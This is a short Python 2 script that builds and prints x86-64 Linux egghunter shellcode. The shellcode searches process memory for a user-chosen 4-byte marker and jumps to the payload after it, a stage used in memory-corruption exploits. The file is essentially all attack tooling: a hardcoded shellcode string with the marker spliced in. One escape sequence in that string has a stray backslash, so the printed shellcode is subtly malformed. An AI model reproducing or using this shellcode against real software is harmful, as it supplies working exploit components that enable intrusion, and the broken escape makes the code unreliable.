#!/usr/bin/python2

import sys

if len(sys.argv) < 2:
    print "error: insert egg"
    print "Usage: " + sys.argv[0] + " 4 bytes egg, example: " + sys.argv[0] + " w00t"
    exit(1)
if (len(sys.argv[1]) != 4):
    print "error: egg must be of 4 bytes!"
    print "Usage: " + sys.argv[0] + " 4 bytes egg, example: " + sys.argv[0] + " w00t"
    exit(1)
egg = sys.argv[1].strip()
print "EGG: ", egg
egg_hex = ""
for b in bytearray(egg): 
    egg_hex += '\\x'
    egg_hex += '%02x' % b


egghunter = "\\x48\\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\x31\\xc9\\x48\\x31\\xff\\x6a\\x08\\x41\\x5a\\x66\\x41\\x81\\xcf\\xff\\x0f\\x49\\xff\\xc7\\x4c\\x89\\xfe\\x6a\\x0d\\x58\\x0f\\x05\\x3c\\xf2\\x74\\xeb\\xb8" + egg_hex +  "\\x48\\x89\\xf7\\xaf\\x75\\xe6\\xaf\\x75\\xe3\\xff\\xe7"



print "=" * 10
print "EGGHUNTER:\n"
print egghunter
